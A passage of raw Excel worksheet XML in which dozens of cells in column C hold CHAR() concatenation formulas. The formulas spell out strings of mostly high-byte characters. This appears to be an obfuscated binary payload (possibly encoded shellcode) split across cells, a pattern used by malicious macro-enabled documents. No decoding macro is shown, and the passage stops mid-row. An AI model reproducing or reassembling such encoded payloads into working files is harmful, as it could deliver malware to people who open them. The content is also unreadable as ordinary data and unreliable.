    <row r="303" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C303" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="304" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C304" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="305" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C305" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="306" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C306" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(134)&amp;CHAR(255)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô†ÿë»ë÷ý</v>
      </c>
    </row>
    <row r="307" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C307" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(126)</f>
        <v>ô6Íë»ë÷ýô~</v>
      </c>
    </row>
    <row r="308" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C308" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(233)&amp;CHAR(247)&amp;CHAR(248)&amp;CHAR(244)&amp;CHAR(166)&amp;CHAR(236)&amp;CHAR(235)</f>
        <v>Íë»é÷øô¦ìë</v>
      </c>
    </row>
    <row r="309" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C309" t="str">
        <f>CHAR(187)&amp;CHAR(63)&amp;CHAR(231)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(55)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(233)</f>
        <v>»?çýô7Íë»é</v>
      </c>
    </row>
    <row r="310" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C310" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(242)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýò6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="311" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C311" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="312" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C312" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="313" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C313" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="314" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C314" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="315" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C315" t="str">
        <f>CHAR(244)&amp;CHAR(40)&amp;CHAR(207)&amp;CHAR(195)&amp;CHAR(178)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(247)&amp;CHAR(222)&amp;CHAR(37)</f>
        <v>ô(ÏÃ²ë÷÷Þ%</v>
      </c>
    </row>
    <row r="316" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C316" t="str">
        <f>CHAR(253)&amp;CHAR(225)&amp;CHAR(187)&amp;CHAR(20)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(55)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>ýá»_x0014_÷ýô7Íë</v>
      </c>
    </row>
    <row r="317" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C317" t="str">
        <f>CHAR(170)&amp;CHAR(153)&amp;CHAR(246)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(70)&amp;CHAR(198)&amp;CHAR(203)&amp;CHAR(217)&amp;CHAR(234)</f>
        <v>ª™öýôFÆËÙê</v>
      </c>
    </row>
    <row r="318" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C318" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(121)&amp;CHAR(52)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(186)&amp;CHAR(206)&amp;CHAR(39)&amp;CHAR(185)</f>
        <v>÷ýy4ÍëºÎ'¹</v>
      </c>
    </row>
    <row r="319" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C319" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(201)&amp;CHAR(195)&amp;CHAR(185)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(247)&amp;CHAR(254)&amp;CHAR(68)</f>
        <v>ô6ÉÃ¹ë÷÷þD</v>
      </c>
    </row>
    <row r="320" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C320" t="str">
        <f>CHAR(206)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(155)&amp;CHAR(252)&amp;CHAR(239)&amp;CHAR(246)&amp;CHAR(200)&amp;CHAR(216)&amp;CHAR(237)</f>
        <v>Îë»›üïöÈØí</v>
      </c>
    </row>
    <row r="321" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C321" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(245)&amp;CHAR(239)&amp;CHAR(247)&amp;CHAR(200)&amp;CHAR(216)&amp;CHAR(238)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ëõï÷ÈØî»ë</v>
      </c>
    </row>
    <row r="322" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C322" t="str">
        <f>CHAR(245)&amp;CHAR(250)&amp;CHAR(224)&amp;CHAR(72)&amp;CHAR(206)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(225)&amp;CHAR(137)&amp;CHAR(254)</f>
        <v>õúàHÎë»á‰þ</v>
      </c>
    </row>
    <row r="323" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C323" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(199)&amp;CHAR(253)&amp;CHAR(155)&amp;CHAR(239)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(252)&amp;CHAR(72)</f>
        <v>ô6Çý›ï÷ýüH</v>
      </c>
    </row>
    <row r="324" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C324" t="str">
        <f>CHAR(206)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(225)&amp;CHAR(227)&amp;CHAR(239)&amp;CHAR(246)&amp;CHAR(36)&amp;CHAR(206)&amp;CHAR(195)</f>
        <v>Îë»áãïö$ÎÃ</v>
      </c>
    </row>
    <row r="325" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C325" t="str">
        <f>CHAR(179)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(251)&amp;CHAR(231)&amp;CHAR(50)&amp;CHAR(223)&amp;CHAR(232)&amp;CHAR(192)&amp;CHAR(207)</f>
        <v>³ë÷ûç2ßèÀÏ</v>
      </c>
    </row>
    <row r="326" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C326" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(240)&amp;CHAR(72)&amp;CHAR(206)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(225)&amp;CHAR(241)&amp;CHAR(115)</f>
        <v>÷ýðHÎë»áñs</v>
      </c>
    </row>
    <row r="327" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C327" t="str">
        <f>CHAR(157)&amp;CHAR(72)&amp;CHAR(204)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(239)&amp;CHAR(137)&amp;CHAR(254)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>HÌë»ï‰þô6</v>
      </c>
    </row>
    <row r="328" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C328" t="str">
        <f>CHAR(201)&amp;CHAR(195)&amp;CHAR(189)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(251)&amp;CHAR(231)&amp;CHAR(51)&amp;CHAR(179)&amp;CHAR(232)</f>
        <v>ÉÃ½ë÷ûç3³è</v>
      </c>
    </row>
    <row r="329" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C329" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(253)&amp;CHAR(238)&amp;CHAR(242)&amp;CHAR(36)&amp;CHAR(206)&amp;CHAR(144)&amp;CHAR(159)&amp;CHAR(235)</f>
        <v>»ëýîò$ÎŸë</v>
      </c>
    </row>
    <row r="330" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C330" t="str">
        <f>CHAR(247)&amp;CHAR(249)&amp;CHAR(229)&amp;CHAR(51)&amp;CHAR(203)&amp;CHAR(237)&amp;CHAR(53)&amp;CHAR(130)&amp;CHAR(229)&amp;CHAR(251)</f>
        <v>÷ùå3Ëí5‚åû</v>
      </c>
    </row>
    <row r="331" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C331" t="str">
        <f>CHAR(220)&amp;CHAR(50)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(189)&amp;CHAR(248)&amp;CHAR(240)&amp;CHAR(235)&amp;CHAR(231)&amp;CHAR(62)</f>
        <v>Ü2Íë½øðëç&gt;</v>
      </c>
    </row>
    <row r="332" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C332" t="str">
        <f>CHAR(223)&amp;CHAR(232)&amp;CHAR(192)&amp;CHAR(207)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(240)&amp;CHAR(39)&amp;CHAR(200)&amp;CHAR(237)</f>
        <v>ßèÀÏ÷ýð'Èí</v>
      </c>
    </row>
    <row r="333" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C333" t="str">
        <f>CHAR(53)&amp;CHAR(130)&amp;CHAR(137)&amp;CHAR(255)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(201)&amp;CHAR(249)&amp;CHAR(179)&amp;CHAR(195)</f>
        <v>5‚‰ÿô6Éù³Ã</v>
      </c>
    </row>
    <row r="334" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C334" t="str">
        <f>CHAR(240)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(48)&amp;CHAR(222)&amp;CHAR(236)&amp;CHAR(169)&amp;CHAR(232)&amp;CHAR(140)&amp;CHAR(219)</f>
        <v>ðýô0Þì©èŒÛ</v>
      </c>
    </row>
    <row r="335" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C335" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(201)&amp;CHAR(195)&amp;CHAR(191)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(247)&amp;CHAR(231)&amp;CHAR(63)</f>
        <v>ô6ÉÃ¿ë÷÷ç?</v>
      </c>
    </row>
    <row r="336" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C336" t="str">
        <f>CHAR(220)&amp;CHAR(226)&amp;CHAR(212)&amp;CHAR(238)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(254)&amp;CHAR(37)&amp;CHAR(199)&amp;CHAR(244)</f>
        <v>ÜâÔî÷ýþ%Çô</v>
      </c>
    </row>
    <row r="337" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C337" t="str">
        <f>CHAR(171)&amp;CHAR(253)&amp;CHAR(230)&amp;CHAR(247)&amp;CHAR(226)&amp;CHAR(89)&amp;CHAR(203)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(225)</f>
        <v>«ýæ÷âYËë»á</v>
      </c>
    </row>
    <row r="338" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C338" t="str">
        <f>CHAR(152)&amp;CHAR(250)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(199)&amp;CHAR(195)&amp;CHAR(184)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(251)</f>
        <v>˜úô6ÇÃ¸ë÷û</v>
      </c>
    </row>
    <row r="339" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C339" t="str">
        <f>CHAR(231)&amp;CHAR(61)&amp;CHAR(220)&amp;CHAR(238)&amp;CHAR(170)&amp;CHAR(224)&amp;CHAR(137)&amp;CHAR(254)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ç=Üîªà‰þô6</v>
      </c>
    </row>
    <row r="340" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C340" t="str">
        <f>CHAR(199)&amp;CHAR(195)&amp;CHAR(190)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(251)&amp;CHAR(231)&amp;CHAR(58)&amp;CHAR(223)&amp;CHAR(232)</f>
        <v>ÇÃ¾ë÷ûç:ßè</v>
      </c>
    </row>
    <row r="341" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C341" t="str">
        <f>CHAR(192)&amp;CHAR(206)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(240)&amp;CHAR(37)&amp;CHAR(192)&amp;CHAR(250)&amp;CHAR(182)&amp;CHAR(195)</f>
        <v>ÀÎ÷ýð%Àú¶Ã</v>
      </c>
    </row>
    <row r="342" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C342" t="str">
        <f>CHAR(254)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(48)&amp;CHAR(235)&amp;CHAR(193)&amp;CHAR(217)&amp;CHAR(203)&amp;CHAR(247)&amp;CHAR(237)</f>
        <v>þýô0ëÁÙË÷í</v>
      </c>
    </row>
    <row r="343" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C343" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(77)&amp;CHAR(234)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(243)&amp;CHAR(226)&amp;CHAR(212)&amp;CHAR(182)</f>
        <v>ô6Mê»ëóâÔ¶</v>
      </c>
    </row>
    <row r="344" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C344" t="str">
        <f>CHAR(207)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(239)&amp;CHAR(237)&amp;CHAR(125)&amp;CHAR(247)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(239)</f>
        <v>Ïë»ïí}÷6Íï</v>
      </c>
    </row>
    <row r="345" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C345" t="str">
        <f>CHAR(145)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>‘ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="346" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C346" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(116)&amp;CHAR(158)&amp;CHAR(161)&amp;CHAR(249)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(252)</f>
        <v>÷ýôtž¡ùê÷ü</v>
      </c>
    </row>
    <row r="347" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C347" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(231)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(64)</f>
        <v>ô6Íë»ç÷ýô@</v>
      </c>
    </row>
    <row r="348" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C348" t="str">
        <f>CHAR(249)&amp;CHAR(197)&amp;CHAR(139)&amp;CHAR(197)&amp;CHAR(196)&amp;CHAR(205)&amp;CHAR(199)&amp;CHAR(7)&amp;CHAR(244)&amp;CHAR(235)</f>
        <v>ùÅ‹ÅÄÍÇ_x0007_ôë</v>
      </c>
    </row>
    <row r="349" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C349" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(248)&amp;CHAR(244)&amp;CHAR(90)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(215)</f>
        <v>»ë÷øôZÍë»×</v>
      </c>
    </row>
    <row r="350" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C350" t="str">
        <f>CHAR(241)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(21)&amp;CHAR(179)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(67)&amp;CHAR(241)&amp;CHAR(253)</f>
        <v>ñýô_x0015_³ë»Cñý</v>
      </c>
    </row>
    <row r="351" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C351" t="str">
        <f>CHAR(244)&amp;CHAR(50)&amp;CHAR(197)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(200)&amp;CHAR(164)&amp;CHAR(137)&amp;CHAR(134)&amp;CHAR(95)</f>
        <v>ô2Åë»È¤‰†_</v>
      </c>
    </row>
    <row r="352" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C352" t="str">
        <f>CHAR(163)&amp;CHAR(140)&amp;CHAR(200)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(154)&amp;CHAR(195)&amp;CHAR(235)</f>
        <v>£ŒÈë÷ýôšÃë</v>
      </c>
    </row>
    <row r="353" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C353" t="str">
        <f>CHAR(187)&amp;CHAR(171)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(21)&amp;CHAR(152)&amp;CHAR(184)&amp;CHAR(187)&amp;CHAR(7)</f>
        <v>»«÷ýô_x0015_˜¸»_x0007_</v>
      </c>
    </row>
    <row r="354" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C354" t="str">
        <f>CHAR(249)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(38)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(200)&amp;CHAR(176)&amp;CHAR(168)</f>
        <v>ùýô&amp;Íë»È°¨</v>
      </c>
    </row>
    <row r="355" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C355" t="str">
        <f>CHAR(189)&amp;CHAR(114)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(23)&amp;CHAR(249)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(238)</f>
        <v>½rÍë»_x0017_ùýôî</v>
      </c>
    </row>
    <row r="356" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C356" t="str">
        <f>CHAR(204)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(200)&amp;CHAR(181)&amp;CHAR(145)&amp;CHAR(155)&amp;CHAR(84)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Ìë»Èµ‘›TÍë</v>
      </c>
    </row>
    <row r="357" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C357" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(52)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(171)&amp;CHAR(188)</f>
        <v>»ë÷ýô4Íë«¼</v>
      </c>
    </row>
    <row r="358" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C358" t="str">
        <f>CHAR(42)&amp;CHAR(255)&amp;CHAR(192)&amp;CHAR(63)&amp;CHAR(207)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(13)&amp;CHAR(252)</f>
        <v>*ÿÀ?Ïë»ë_x000D_ü</v>
      </c>
    </row>
    <row r="359" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C359" t="str">
        <f>CHAR(199)&amp;CHAR(54)&amp;CHAR(219)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(57)</f>
        <v>Ç6Ûë»ê÷ýô9</v>
      </c>
    </row>
    <row r="360" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C360" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(226)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(114)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»â÷ýôrÍë</v>
      </c>
    </row>
    <row r="361" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C361" t="str">
        <f>CHAR(187)&amp;CHAR(224)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(23)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(224)</f>
        <v>»à÷ýô_x0017_Íë»à</v>
      </c>
    </row>
    <row r="362" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C362" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(17)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(237)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô_x0011_Íë»í÷ý</v>
      </c>
    </row>
    <row r="363" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C363" t="str">
        <f>CHAR(244)&amp;CHAR(55)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(55)</f>
        <v>ô7Íë»ê÷ýô7</v>
      </c>
    </row>
    <row r="364" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C364" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(62)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ê÷ýô&gt;Íë</v>
      </c>
    </row>
    <row r="365" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C365" t="str">
        <f>CHAR(187)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(55)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(233)</f>
        <v>»ê÷ýô7Íë»é</v>
      </c>
    </row>
    <row r="366" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C366" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(48)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(23)</f>
        <v>÷ýô0Íë»ë÷_x0017_</v>
      </c>
    </row>
    <row r="367" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C367" t="str">
        <f>CHAR(243)&amp;CHAR(55)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(251)&amp;CHAR(244)&amp;CHAR(7)</f>
        <v>ó7Íë»ë÷ûô_x0007_</v>
      </c>
    </row>
    <row r="368" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C368" t="str">
        <f>CHAR(201)&amp;CHAR(160)&amp;CHAR(191)&amp;CHAR(237)&amp;CHAR(247)&amp;CHAR(156)&amp;CHAR(240)&amp;CHAR(80)&amp;CHAR(201)&amp;CHAR(237)</f>
        <v>É ¿í÷œðPÉí</v>
      </c>
    </row>
    <row r="369" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C369" t="str">
        <f>CHAR(187)&amp;CHAR(32)&amp;CHAR(243)&amp;CHAR(39)&amp;CHAR(240)&amp;CHAR(48)&amp;CHAR(205)&amp;CHAR(225)&amp;CHAR(190)&amp;CHAR(141)</f>
        <v>» ó'ð0Íá¾</v>
      </c>
    </row>
    <row r="370" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C370" t="str">
        <f>CHAR(243)&amp;CHAR(251)&amp;CHAR(244)&amp;CHAR(38)&amp;CHAR(200)&amp;CHAR(141)&amp;CHAR(191)&amp;CHAR(237)&amp;CHAR(247)&amp;CHAR(222)</f>
        <v>óûô&amp;È¿í÷Þ</v>
      </c>
    </row>
    <row r="371" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C371" t="str">
        <f>CHAR(241)&amp;CHAR(80)&amp;CHAR(201)&amp;CHAR(225)&amp;CHAR(187)&amp;CHAR(196)&amp;CHAR(242)&amp;CHAR(202)&amp;CHAR(241)&amp;CHAR(60)</f>
        <v>ñPÉá»ÄòÊñ&lt;</v>
      </c>
    </row>
    <row r="372" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C372" t="str">
        <f>CHAR(205)&amp;CHAR(178)&amp;CHAR(190)&amp;CHAR(220)&amp;CHAR(242)&amp;CHAR(247)&amp;CHAR(244)&amp;CHAR(176)&amp;CHAR(200)&amp;CHAR(220)</f>
        <v>Í²¾Üò÷ô°ÈÜ</v>
      </c>
    </row>
    <row r="373" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C373" t="str">
        <f>CHAR(190)&amp;CHAR(237)&amp;CHAR(247)&amp;CHAR(102)&amp;CHAR(241)&amp;CHAR(80)&amp;CHAR(201)&amp;CHAR(237)&amp;CHAR(187)&amp;CHAR(154)</f>
        <v>¾í÷fñPÉí»š</v>
      </c>
    </row>
    <row r="374" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C374" t="str">
        <f>CHAR(240)&amp;CHAR(155)&amp;CHAR(240)&amp;CHAR(48)&amp;CHAR(205)&amp;CHAR(147)&amp;CHAR(188)&amp;CHAR(49)&amp;CHAR(243)&amp;CHAR(251)</f>
        <v>ð›ð0Í“¼1óû</v>
      </c>
    </row>
    <row r="375" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C375" t="str">
        <f>CHAR(244)&amp;CHAR(169)&amp;CHAR(202)&amp;CHAR(141)&amp;CHAR(191)&amp;CHAR(237)&amp;CHAR(247)&amp;CHAR(89)&amp;CHAR(243)&amp;CHAR(80)</f>
        <v>ô©Ê¿í÷YóP</v>
      </c>
    </row>
    <row r="376" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C376" t="str">
        <f>CHAR(201)&amp;CHAR(237)&amp;CHAR(187)&amp;CHAR(40)&amp;CHAR(240)&amp;CHAR(39)&amp;CHAR(240)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Éí»(ð'ð6Íë</v>
      </c>
    </row>
    <row r="377" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C377" t="str">
        <f>CHAR(187)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(234)&amp;CHAR(187)&amp;CHAR(234)</f>
        <v>»ê÷ýô6Íê»ê</v>
      </c>
    </row>
    <row r="378" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C378" t="str">
        <f>CHAR(247)&amp;CHAR(252)&amp;CHAR(244)&amp;CHAR(38)&amp;CHAR(205)&amp;CHAR(225)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(208)</f>
        <v>÷üô&amp;Íá»ë÷Ð</v>
      </c>
    </row>
    <row r="379" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C379" t="str">
        <f>CHAR(244)&amp;CHAR(55)&amp;CHAR(205)&amp;CHAR(234)&amp;CHAR(187)&amp;CHAR(233)&amp;CHAR(246)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(57)</f>
        <v>ô7Íê»éöýô9</v>
      </c>
    </row>
    <row r="380" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C380" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(222)&amp;CHAR(247)&amp;CHAR(249)&amp;CHAR(244)&amp;CHAR(58)&amp;CHAR(205)&amp;CHAR(233)</f>
        <v>Íë»Þ÷ùô:Íé</v>
      </c>
    </row>
    <row r="381" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C381" t="str">
